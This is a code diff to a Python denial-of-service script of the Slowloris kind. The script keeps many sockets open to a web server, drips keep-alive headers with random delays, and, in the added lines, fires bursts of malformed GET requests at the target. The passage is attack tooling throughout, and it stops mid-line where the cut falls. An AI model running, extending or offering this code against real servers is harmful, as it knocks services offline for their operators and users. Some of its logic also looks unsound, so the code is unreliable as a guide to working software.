@@ -48,6 +48,9 @@ def main():
 
         for s in socket_list:
             try:
+                # Add a random delay to the next keep-alive header
+                time.sleep(random.randint(1, 10))
+
                 s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
             except socket.error:
                 socket_list.remove(s)
@@ -73,9 +76,6 @@ def main():
         if len(socket_list) == 0:
             break
 
-        # Add a random delay to the next keep-alive header
-        time.sleep(random.randint(1, 10))
-
         # Add a random delay to the time between each keep-alive header
         time.sleep(random.randint(1, 10))
 
@@ -91,5 +91,6 @@ def main():
         for header in regular_headers:
             s.send(header + b'\n' + random.randint(1, 1024).to_bytes(4, 'big') + b'\r\n')
 
-if __name__ == "__main__":
-    main()
+        # Add a random amount of malformed requests
+        for _ in range(random.randint(0, 10)):
+            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(
